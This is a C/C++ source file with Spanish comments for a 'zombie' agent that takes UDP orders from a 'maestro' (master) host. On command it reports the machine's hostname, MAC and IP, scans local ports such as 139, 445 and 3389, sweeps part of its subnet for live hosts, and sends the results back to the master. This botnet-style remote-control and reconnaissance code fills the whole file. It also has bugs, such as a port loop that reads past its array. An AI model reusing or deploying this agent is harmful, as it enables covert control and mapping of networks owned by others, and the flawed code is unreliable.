// Librerias
//----------------------------------------------------------------------------------------------------------------------
#if defined(_WIN32) || defined(__WIN32__)
    // Libreria para estructura "in_addr"
    #include <winsock2.h>
#elif defined(linux) || defined(__linux)
    // Libreria para estructura "in_addr"
    #include <arpa/inet.h>
    // Librerias para recuperar direcci�n IP
    #include <netdb.h>
    // Librerias de correcci�n
    #include <sys/ioctl.h>
    #include <ifaddrs.h>
    #include <net/if.h>
    #include <pthread.h>
    #include <netinet/in.h>
    #include <sys/socket.h>
    #include <sys/types.h>
	#include <sys/stat.h>
	#include <unistd.h>
	#include <errno.h>
	#include <fcntl.h>
	#include <sys/ipc.h>
    #include <sys/msg.h>
    #include <net/ethernet.h>
    #include <net/if_arp.h>
#endif

// Librerias con funciones generales
#include "zomutils/utiles.h"

// Definiciones - PUERTOS
//----------------------------------------------------------------------------------------------------------------------
#define PORT_Listen	5000	// Puerto por donde este zombie, escucha a su maestro (Entrada) (* Es el puerto de entrada para este zombie)
#define PORT_Speak	5025	// Puerto por donde este zombie, responde a su maestro (Salida) (* Se espera, sea el puerto de entrada del lado del maestro)

// Variables
//----------------------------------------------------------------------------------------------------------------------

int estoyDescubriendoSrvs = 0;
int estoyBarriendoMiRed = 0;

pthread_mutex_t candadoDeHilo;

// Anuncio de funciones y metodos
//----------------------------------------------------------------------------------------------------------------------

void esperarPorPeticiones();

void *fun_presentarseConElMaestro(void *mensaje);
void *fun_descubrirServicios(void *mensaje);
void *fuc_barrerEstaRed(void *mensaje);

// Funciones adicionales
//----------------------------------------------------------------------------------------------------------------------
bool isInOpenPort(char *ipAdr, int portHost);
char *testIpHost(const char *IP);

//----------------------------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------------------------

int main() {
    // Si Windows
    #if defined(_WIN32) || defined(__WIN32__)
        // Variables para validar red
        int errNet;
        WSADATA wsaData;
        WORD wVersionRequested;
        // Inicializar requerimientos de red
        wVersionRequested = MAKEWORD( 2, 2 );
        errNet = WSAStartup( wVersionRequested, &wsaData );
        // Validar inicio de red
        if(errNet != 0) {
            // Mostrar codigo de error
            printf("Fallo en la red, código de error: %d\n", errNet);
            // Limpiar configuraci�n de red
            WSACleanup();
        } else {
            // Recuperar mi informaci�n
            // Host Name
            sprintf(myHostName, "%s", recuperarHostName(TAM_HostN));
            printf("Host name: %s.\n", myHostName);
            // Direcci�n MAC
            sprintf(myMAC, "%s", recuperarDirMAC());
            printf("Dir. MAC: %s.\n", myMAC);
            // Direcci�n IP
            DWORD axIP = inet_addr(recuperarDirIP());
            myIP.S_un.S_addr = axIP;
            printf("Dir. IP: %s.\n", inet_ntoa(myIP));
            // Iniciar comunicaciones
            esperarPorPeticiones();
            // Limpiar configuraci�n de red
            WSACleanup();
        }
    #elif defined(linux) || defined(__linux)
        // Recuperar mi informaci�n
        // Host Name
        sprintf(myHostName, "%s", recuperarHostName(TAM_HostN));
        printf("Host name: %s.\n", myHostName);
        // Direcci�n MAC
        sprintf(myMAC, "%s", recuperarDirMAC());
        printf("Dir. MAC: %s.\n", myMAC);
        // Direcci�n IP
        myIP.s_addr = inet_addr(recuperarDirIP());
        printf("Dir. IP: %s.\n", inet_ntoa(myIP));
        // Iniciar comunicaciones
        esperarPorPeticiones();
    #endif
    // Finalizar programa
	return 0;
}

//----------------------------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------------------------
//----------------------------------------------------------------------------------------------------------------------

// Funciones
//----------------------------------------------------------------------------------------------------------------------
void esperarPorPeticiones() {
    // Variables
    int sin_len;
	int socket_descriptor;      // Identificador del socket
	bool terminarProcesoES = 0; // Bandera de proceso Entrada/Salida
	// Iniciar estructura de direcciones de socket para protocolos
	struct sockaddr_in sin;
	// Configurar socket de direcciones para comunicaci�n
	memset(&(sin.sin_zero), '\0', 8);
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons(PORT_Listen); // Puerto por donde el maestro habla con este zombie
	sin_len = sizeof(sin); // Tama�o del SOKECT de comunicaci�n
	// Crea un socket UDP y unirlo al puerto
	socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
	bind(socket_descriptor, (struct sockaddr *) &sin, sizeof(sin));
    // Iniciar Hilo
	pthread_mutex_init(&candadoDeHilo, NULL);
	// Ciclo infinito de escucha
	while (!terminarProcesoES) {
        printf("--------------------------------------------------------------\n");
        printf("Escuchando al maestro...\n");
        // Variable para recibir mensaje
        struct formato_msj peticion;
        // Si es WINDOWS
        #if defined(WIN32) || defined(_WIN32) || defined(_WIN64)
            // Recibir mensaje/petici�n
            recvfrom(socket_descriptor, (char*) &peticion, sizeof(peticion), 0, (struct sockaddr *) &sin, &sin_len);
        #elif defined(linux) || defined(__linux)
            // Recibir mensaje/petici�n
            recvfrom(socket_descriptor, (char*) &peticion, sizeof(peticion), 0, (struct sockaddr *) &sin, (socklen_t*) &sin_len);
        #endif
        // Validar correspondencia de mensaje a este zombie
        if ((peticion.clave == 3) || (string(inet_ntoa(peticion.xIP)) == string(inet_ntoa(myIP)))) {
            // Variables
            pthread_t idHiloRespuesta;          // Hilo
            pthread_attr_t attrHiloRespuesta;	// Atributos del Hilo
            // Atender mensaje
            switch(peticion.clave){
                case 2:
                    // Terminar proceso
                    printf("Orden - Términar.\n");
                    terminarProcesoES = 1;
                    break;
                case 3:
                    printf("Orden - Presentarse.\n");
                        pthread_attr_init( & attrHiloRespuesta);
                        pthread_create(&idHiloRespuesta, &attrHiloRespuesta, fun_presentarseConElMaestro, &peticion);
                        pthread_attr_destroy(& attrHiloRespuesta);
                    break;
                case 4:
                    // Entrega al maestro un resumen de los servicios en el equipo
                    printf("Orden - Descubrir servicios.\n");
                    estoyDescubriendoSrvs = 1;
                        //------------------------------------------------------------------------------------------------
                        pthread_attr_init( & attrHiloRespuesta);
                        pthread_create(&idHiloRespuesta, &attrHiloRespuesta, fun_descubrirServicios, &peticion);
                        pthread_attr_destroy(& attrHiloRespuesta);
                        //------------------------------------------------------------------------------------------------
                    estoyDescubriendoSrvs = 0;
                    break;
                case 5:
                    // Entrega al maestro un resumen con otros dispositivos en esta red
                    printf("Orden - Barrer a la red\n");
                    estoyBarriendoMiRed = 1;
                        //printf("Aun no implementado...\n");
                        //------------------------------------------------------------------------------------------------
                        pthread_attr_init( & attrHiloRespuesta);
                        pthread_create(&idHiloRespuesta, &attrHiloRespuesta, fuc_barrerEstaRed, &peticion);
                        pthread_attr_destroy(& attrHiloRespuesta);
                        //------------------------------------------------------------------------------------------------
                    estoyBarriendoMiRed = 0;
                    break;
                default:
                    printf("Orden - No reconocida.\n");
                    break;
            }
        } else{
            // Si, por error, se recibe un mensaje no dirigido a si mismo
            printf("Orden - No correspondida.\n");
        }
        printf("--------------------------------------------------------------\n");
	}
	// Cerrar socket
	close(socket_descriptor);
}

void *fun_presentarseConElMaestro(void *mensaje) {
    // Variables
    struct formato_msj msj = *(struct formato_msj *) mensaje;
	int socket_descriptor;
	int bOptVal = 1;
	// Iniciar la estructura de direcciones de socket
	struct sockaddr_in address;
	memset(&(address.sin_zero), '\0', 8);
	// Configurar estructura de socket
	address.sin_family = AF_INET;
	// Asigna IP del host destino
	address.sin_addr.s_addr = inet_addr(inet_ntoa(msj.zIP));
	// Puerto por donde el maestro escucha a este zombie
	address.sin_port = htons(PORT_Speak);

	// Crear socket UDP
	socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
	// -------------------------------------------------------------
	printf("v v v v v v v v v v v v v v v v v v v v v v v v v v\n");
	// Validar conexi�n UDP
    if (setsockopt(socket_descriptor, SOL_SOCKET, SO_BROADCAST, (char *) &bOptVal, sizeof(bOptVal)) < 0) {
		printf("Error al crear el Socket para responder al maestro.\n");
	} else {
		// Estructurar respuesta para el maestro
		msj.xIP.s_addr = inet_addr(inet_ntoa(myIP));
		// Variable
		int iax;
		// Limpiar y agregar nombre de host
		for (iax = 0; iax < TAM_HostN; iax++) {
			msj.xHostN[iax] = 0;
			msj.xHostN[iax] = myHostName[iax];
		}
		// Limpiar y agregar direccion MAC del Zombie
    	for(iax = 0; iax < TAM_DirMAC; iax++){
            msj.xMAC[iax] = 0;
    		msj.xMAC[iax] = myMAC[iax];
	    }

	    // Limpiar espacio de datos
	    for(iax = 0; iax < TAM_Datos; iax++){
	    	msj.xDatos[iax] = 0;
	    }
        // Mensaje
        char respuestaX[TAM_Datos];
        strcpy (respuestaX, "");
        // Ocupado -------------
        if (estoyDescubriendoSrvs) {
            strcat (respuestaX, construir_xDatos(msj.clave, "Descubriendo mis servicios"));
        } else if(estoyBarriendoMiRed) {
            strcat (respuestaX, construir_xDatos(msj.clave, "Barriendo mi red"));
        } else {
            strcat (respuestaX, construir_xDatos(msj.clave, "Desocupado"));
        }
        // Armar respuesta
        sprintf(msj.xDatos, "%s", respuestaX);
		// Respondiendo al maestro
		if (sendto(socket_descriptor, (char*) &msj, sizeof(msj), 0, (struct sockaddr *) &address, sizeof(address)) == -1) {
            // Si algo salio mal al enviar el mensaje
			printf("Error al enviar un mensaje al maestro.\n");
		} else {
            // Imprimir mensaje enviado
            imprimirStruct(msj);
        }
        // Cerrar socket
		close(socket_descriptor);
	}
	// -------------------------------------------------------------
	printf("^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^\n");
	return 0;
}

void *fun_descubrirServicios(void *mensaje) {
    // Variables
    struct formato_msj msj = *(struct formato_msj *) mensaje;
	int socket_descriptor;
	int bOptVal = 1;
	// Iniciar la estructura de direcciones de socket
	struct sockaddr_in address;
	memset(&(address.sin_zero), '\0', 8);
	// Configurar estructura de socket
	address.sin_family = AF_INET;
	// Asigna IP del host destino
	address.sin_addr.s_addr = inet_addr(inet_ntoa(msj.zIP));
	// Puerto por donde el maestro escucha a este zombie
	address.sin_port = htons(PORT_Speak);

	// Crear socket UDP
	socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
	// -------------------------------------------------------------
	printf("v v v v v v v v v v v v v v v v v v v v v v v v v v\n");

    if (setsockopt(socket_descriptor, SOL_SOCKET, SO_BROADCAST, (char *) &bOptVal, sizeof(bOptVal)) < 0){
		printf("Error al crear el Socket para responder al maestro.\n");
	} else {
		//Estructurando respuesta para el maestro
		msj.xIP.s_addr = inet_addr(inet_ntoa(myIP));
		// Variable
		int iax;
		// Limpiar y agregar nombre de host
		for (iax = 0; iax < TAM_HostN; iax++) {
			msj.xHostN[iax] = 0;
			msj.xHostN[iax] = myHostName[iax];
		}
		// Limpiar y agregar direccion MAC del Zombie
    	for(iax = 0; iax < TAM_DirMAC; iax++){
            msj.xMAC[iax] = 0;
    		msj.xMAC[iax] = myMAC[iax];
	    }

	    // Limpiar espacio de datos
	    for(iax = 0; iax < TAM_Datos; iax++){
	    	msj.xDatos[iax] = 0;
	    }

	    // Informaci�n de puertos
        int aryPuertos[] = {139, 445, 3389, 80};
	    // int aryPuertos[] = {21, 22, 23, 25, 66, 79, 80, 107, 110, 118, 119, 137, 138, 139, 150, 161, 194, 209, 217, 389, 407, 443, 445, 515, 522, 531, 568, 569, 666, 700, 701, 992, 993, 995, 1024, 1414, 1417, 1418, 1419, 1420, 1424, 1547, 1720, 1731, 1812, 1813, 2300, 2301, 2302, 2303, 2304, 2305, 2306, 2306, 2307, 2308, 2309, 2309, 2310, 2311, 2400, 2611, 2612, 3000, 3128, 2301, 3389, 3568, 3569, 4000, 4099, 4661, 4662, 4665, 5190, 5500, 3568, 5631, 5632, 5670, 5800, 5900, 6003, 6112, 6257, 6346, 6346, 6500, 6667, 6699, 6700, 6880, 7002, 7013, 7500, 7640, 7642, 7648, 7649, 7777, 7778, 7779, 7780, 7781, 8000, 8080, 9000, 9004, 9005, 9008, 9012, 9013, 12000, 12053, 12083, 12080, 12120, 12122, 23077, 23078, 23079, 24150, 26000, 26214, 27015, 27500, 27660, 27661, 27662, 27900, 27910, 27960, 28800, 47624, 56800};

        /*
        * Otros puertos populares
        // 7000-7100
	    // 3100-3999
	    // 20000-20019
        */

        // Variables para direcci�n IP
        char *ax_charIpPoint = inet_ntoa(myIP);
        char strPuertosInfo[TAM_Datos];

        // Preparar respuesta
        strcpy (strPuertosInfo, "");
        strcat (strPuertosInfo, processIntoToCharP(msj.clave));
        strcat (strPuertosInfo,"_");

        // Variables de puertos
	    int lenAryPuertos = sizeof(aryPuertos);
	    int ax_puertoSrv = 0;
	    // Recorrer puertos
	    for (iax = 0; iax < lenAryPuertos; iax++) {
            // Variable para puerto
            ax_puertoSrv = aryPuertos[iax];
            // Evaluar puertos
            if (isInOpenPort(ax_charIpPoint, ax_puertoSrv)) {
                // Integer to CharArray
                char ax_strcnumber[(((sizeof ax_puertoSrv) * CHAR_BIT) + 2)/3 + 2];
                sprintf(ax_strcnumber, "%d", ax_puertoSrv);
                // printf("El puerto %i se encuentra abierto\n", ax_puertoSrv);
                strcat (strPuertosInfo, ax_strcnumber);
                strcat (strPuertosInfo,"|");
            }
	    }
        // Armar respuesta para maestro
        sprintf(msj.xDatos, "%s", strPuertosInfo);
        // printf("Puertos abiertos: %s.\n", msj.xDatos);

        // Respondiendo al maestro
        if (sendto(socket_descriptor, (char*) &msj, sizeof(msj), 0, (struct sockaddr *) &address, sizeof(address)) == -1){
            printf("Error al responder al maestro por descubrir.\n"); // Si algo salio mal al enviar el mensaje
        } else {
            // Imprimir mensaje enviado
            imprimirStruct(msj);
        }
        // Cerrar socket
		close(socket_descriptor);
	}
	// -------------------------------------------------------------
	printf("^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^\n");
    return 0;
}

void *fuc_barrerEstaRed(void *mensaje) {
    // Variables
    struct formato_msj msj = *(struct formato_msj *) mensaje;
	int socket_descriptor;
	int bOptVal = 1;
	// Iniciar la estructura de direcciones de socket
	struct sockaddr_in address;
	memset(&(address.sin_zero), '\0', 8);
	// Configurar estructura de socket
	address.sin_family = AF_INET;
	// Asigna IP del host destino
	address.sin_addr.s_addr = inet_addr(inet_ntoa(msj.zIP));
	// Puerto por donde el maestro escucha a este zombie
	address.sin_port = htons(PORT_Speak);

	// Crear socket UDP
	socket_descriptor = socket(AF_INET, SOCK_DGRAM, 0);
	// -------------------------------------------------------------
	printf("v v v v v v v v v v v v v v v v v v v v v v v v v v\n");

	if (setsockopt(socket_descriptor, SOL_SOCKET, SO_BROADCAST, (char *) &bOptVal, sizeof(bOptVal)) < 0){
		printf("Error al crear el Socket para responder al maestro.\n");
	} else {
		//Estructurando respuesta para el maestro
		msj.xIP.s_addr = inet_addr(inet_ntoa(myIP));
		// Variable
		int iax;
		// Limpiar y agregar nombre de host
		for (iax = 0; iax < TAM_HostN; iax++) {
			msj.xHostN[iax] = 0;
			msj.xHostN[iax] = myHostName[iax];
		}
		// Limpiar y agregar direccion MAC del Zombie
    	for(iax = 0; iax < TAM_DirMAC; iax++){
            msj.xMAC[iax] = 0;
    		msj.xMAC[iax] = myMAC[iax];
	    }

	    // Limpiar espacio de datos
	    for(iax = 0; iax < TAM_Datos; iax++){
	    	msj.xDatos[iax] = 0;
	    }

        // Variables para direcci�n IP
        int ax_contador = 0;
        char ax_cayIpAddres[16];
        char ax_cnnIpAddres[16];
        char *ax_myIpAddrs = inet_ntoa(myIP);
        strcpy (ax_cnnIpAddres, ax_myIpAddrs);
        // Crear direcci�n base
        for (int xx = 0; xx < 16; xx++) {
            // Validar contador
            if (ax_contador < 3) {
                // Salvar parte de IP
                ax_cayIpAddres[xx] = ax_cnnIpAddres[xx];
                // Validar caracter
                if (ax_cnnIpAddres[xx] == '.') {
                    // Aumentar contador
                    ax_contador++;
                }
            }
        }

        // Variables de datos
        char strDataResult[TAM_Datos];

        // Preparar respuesta
        strcpy (strDataResult, "");
        strcat (strDataResult, processIntoToCharP(msj.clave));
        strcat (strDataResult,"_");

        // Recorrer direcciones posibles
	    // for (int ii = 2; ii < 255; ii++) {
        for (int ii = 150; ii < 170; ii++) {
            // Base IP
            char ax_ca_ip[16];
            strcpy (ax_ca_ip, ax_cayIpAddres);

            // Construir direcci�n IP objetivo
            char ax_cl_ip[(((sizeof ii) * CHAR_BIT) + 2)/3 + 2];
            sprintf(ax_cl_ip, "%d", ii);
            strcat (ax_ca_ip, ax_cl_ip);

            // Validar que no sea myIP
            if ( string(ax_ca_ip) != string(ax_cnnIpAddres) ) {
                // // Imprimir comparaci�n
                // printf("Diferentes [ %s ] [ %s ].\n", ax_ca_ip, ax_cnnIpAddres);
                // Evaluar direcci�n IP
                char* resultado = testIpHost(ax_ca_ip);
                // Validar resultados
                if (resultado != 0) {
                    // Concatenar resultados
                    strcat (strDataResult, ax_ca_ip);
                    strcat (strDataResult, ":");
                    strcat (strDataResult, resultado);
                    strcat (strDataResult, "|");
                    // Imprimir resultado
                    // printf("TEST [ %s ].\n", strDataResult);
                }
            }
            // else {
            //    // Imprimir comparaci�n
            //    printf("Iguales [ %s ] [ %s ].\n", ax_ca_ip, ax_cnnIpAddres);
            //}
	    }
	    // Armar respuesta para maestro
        sprintf(msj.xDatos, "%s", strDataResult);
        // printf("Hosts descubiertos: %s.\n", msj.xDatos);

        //Respondiendo al maestro
        if (sendto(socket_descriptor, (char*) &msj, sizeof(msj), 0, (struct sockaddr *) &address, sizeof(address)) == -1){
            printf("Error al responder al maestro por descubrir.\n"); // Si algo salio mal al enviar el mensaje
        } else {
            // Imprimir mensaje enviado
            imprimirStruct(msj);
        }
        // Cerrar socket
		close(socket_descriptor);
	}
	// -------------------------------------------------------------
	printf("^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^\n");
    return 0;
}

// Funciones adicionales
//----------------------------------------------------------------------------------------------------------------------
bool isInOpenPort(char *ipAdr, int portHost) {

    // Si Windows
    #if defined(_WIN32) || defined(__WIN32__)
        SOCKET sckX;
    #elif defined(linux) || defined(__linux)
        short int sckX;
    #endif
    // Variables
	int iResult, nret;
	bool bResult = false;
	sockaddr_in clientSrv;

	// Ajustes del socket de direcci�n
	memset(&clientSrv,0x00,sizeof(clientSrv));
    // Ajuste para host destino
    clientSrv.sin_family = AF_INET;
    clientSrv.sin_addr.s_addr = inet_addr(ipAdr);
    // Ajustes del socket
	// sckX = INVALID_SOCKET;
	sckX = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // Si Windows
    #if defined(_WIN32) || defined(__WIN32__)
        // Validar creaci�n del socket
        if(sckX == INVALID_SOCKET) {
            printf("Error al crear el socket, código: %d\n", WSAGetLastError());
            closesocket(sckX);
            return bResult;
        }
    #elif defined(linux) || defined(__linux)
        // Validar creaci�n del socket
        if(sckX < 0) {
            printf("Error al crear el socket.\n");
            close(sckX);
            return bResult;
        }
    #endif

    // Conectar a puerto
	clientSrv.sin_port = htons(portHost);
    // Si Windows
    #if defined(_WIN32) || defined(__WIN32__)
	    iResult = connect(sckX, (SOCKADDR *) & clientSrv, sizeof (clientSrv));
        // Validar conexión a puerto
        if (iResult != SOCKET_ERROR) {
            // printf(" Puerto abierto encontrado: %i.\n", portHost);
            bResult = true;
        }
        //else {
        //    printf(" Error en el puerto: %i.\n", portHost);
        //}
    #elif defined(linux) || defined(__linux)
        iResult = connect(sckX, (struct sockaddr *) & clientSrv, sizeof (clientSrv));
        // Variables de error
        int soktError = 0;
        socklen_t lenSktEr = sizeof(soktError);
        getsockopt(sckX, SOL_SOCKET, SO_ERROR, &soktError, &lenSktEr);
        // Validar resultados
        if (soktError == 0){
            bResult = true;
        }
        //else {
        //    return false;
        //}
    #endif
    // Si Windows
    #if defined(_WIN32) || defined(__WIN32__)
        // Cerrar socket
        closesocket(sckX);
    #elif defined(linux) || defined(__linux)
        // Cerrar socket
        close(sckX);
    #endif
    // Regresar resultado
	return bResult;
}

char *testIpHost(const char *IP) {
    // Variables
    int i = 0;
    char *buff_x = 0;
    char BUFFER[65] = "";
    struct sockaddr_in SIN;
    // Ajustes
    memset(&SIN, 0, sizeof(SIN));
    // Configurar SOCKET
    SIN.sin_port        = 0;
    SIN.sin_family      = AF_INET;
    SIN.sin_addr.s_addr = inet_addr(IP);
    // Recuperar informaci�n de enlace por SOCKET
    getnameinfo( (struct sockaddr *)&SIN , sizeof(SIN), BUFFER, 64, NULL, 0, 0);
    int numero = strlen(BUFFER);
    // Validar resultados
    if(!isdigit(BUFFER[2])) {
        buff_x = (char *)malloc(65);
        sprintf(buff_x, "%s", BUFFER);
    }
    // Regresar resultado
    return buff_x;
}
